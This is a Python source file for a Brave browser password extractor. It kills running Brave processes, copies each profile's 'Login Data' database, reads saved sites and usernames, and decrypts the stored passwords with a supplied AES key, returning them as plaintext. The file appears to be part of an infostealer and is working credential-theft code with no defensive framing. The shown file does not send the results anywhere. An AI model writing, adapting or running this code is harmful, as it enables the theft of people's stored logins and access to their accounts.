import os
import sqlite3
import shutil
import time
from Cryptodome.Cipher import AES
from pathlib import Path
from colorama import init, Fore, Style

# Initialize colorama for colored console output
init()


class BraveWKeyPasswordExtractor:
    def __init__(self, profile_path: str, secret_key: bytes):
        """Initialize Brave password extractor with a custom profile path and decrypted key."""
        self.browser_name = "Brave"
        self.profile_path = self._validate_profile_path(profile_path)
        self.secret_key = secret_key

    def _validate_profile_path(self, profile_path: str) -> str:
        """Validate the provided profile path."""
        path = Path(profile_path)
        if not path.exists():
            raise ValueError(
                f"{Fore.RED}Profile path does not exist: {profile_path}{Style.RESET_ALL}"
            )
        return str(path)

    def decrypt_password(
        self, ciphertext: bytes, secret_key: bytes, profile: str = "", url: str = ""
    ) -> str:
        """Decrypt a password using the provided secret key."""
        if not ciphertext:
            return None
        if ciphertext.startswith(b"v10"):
            try:
                if len(ciphertext) < 31:
                    print(
                        f"{Fore.YELLOW}Skipping short ciphertext for profile {profile}, URL {url}{Style.RESET_ALL}"
                    )
                    return None
                iv = ciphertext[3:15]
                encrypted_password = ciphertext[15:-16]
                tag = ciphertext[-16:]
                if len(tag) != 16:
                    print(
                        f"{Fore.YELLOW}Skipping malformed tag for profile {profile}, URL {url}{Style.RESET_ALL}"
                    )
                    return None
                cipher = AES.new(secret_key, AES.MODE_GCM, nonce=iv)
                decrypted_pass = cipher.decrypt_and_verify(encrypted_password, tag)
                return decrypted_pass.decode("utf-8")
            except Exception as e:
                print(
                    f"{Fore.RED}Error decrypting password for profile {profile}, URL {url}: {str(e)}{Style.RESET_ALL}"
                )
                return None
        else:
            print(
                f"{Fore.YELLOW}Unsupported encryption format for profile {profile}, URL {url}{Style.RESET_ALL}"
            )
            return None

    def get_db_connection(self, login_db_path: str) -> sqlite3.Connection:
        """Create a temporary copy of the Login Data database and establish a connection."""
        try:
            if not os.path.exists(login_db_path):
                print(
                    f"{Fore.RED}Database file not found: {login_db_path}{Style.RESET_ALL}"
                )
                return None
            temp_path = "Loginvault.db"
            shutil.copy2(login_db_path, temp_path)
            return sqlite3.connect(temp_path)
        except Exception as e:
            print(f"{Fore.RED}Error connecting to database: {str(e)}{Style.RESET_ALL}")
            return None

    def get_login_data_paths(self) -> list:
        """Retrieve paths to all Login Data files across Brave profiles."""
        paths = []
        for folder in os.listdir(self.profile_path):
            if folder.startswith("Profile") or folder == "Default":
                login_data_path = os.path.join(self.profile_path, folder, "Login Data")
                if os.path.exists(login_data_path):
                    paths.append((login_data_path, folder))
        return paths

    def kill_browser_process(self):
        """Terminate Brave processes to prevent file access conflicts."""
        os.system("taskkill /F /IM brave.exe /T 2>nul")
        time.sleep(1)

    def extract_passwords(self, output_path=None) -> list:
        """Extract passwords from all Brave profiles and return credentials list."""
        credentials = []
        self.kill_browser_process()
        if not self.secret_key:
            print(f"{Fore.RED}No secret key provided{Style.RESET_ALL}")
            return credentials

        login_data_paths = self.get_login_data_paths()
        if not login_data_paths:
            print(
                f"{Fore.RED}No profiles with 'Login Data' found in {self.profile_path}{Style.RESET_ALL}"
            )
            return credentials

        for login_db_path, profile in login_data_paths:
            print(
                f"{Fore.CYAN}Extracting from Brave profile: {profile}{Style.RESET_ALL}"
            )
            conn = self.get_db_connection(login_db_path)
            if not conn:
                continue
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            for row in cursor.fetchall():
                origin_url, username, ciphertext = row
                if origin_url and username and ciphertext:
                    password = self.decrypt_password(
                        ciphertext, self.secret_key, profile, origin_url
                    )
                    if password:
                        credentials.append(
                            {
                                "browser": self.browser_name,
                                "profile": profile,
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )
            cursor.close()
            conn.close()
            if os.path.exists("Loginvault.db"):
                os.remove("Loginvault.db")

        return credentials
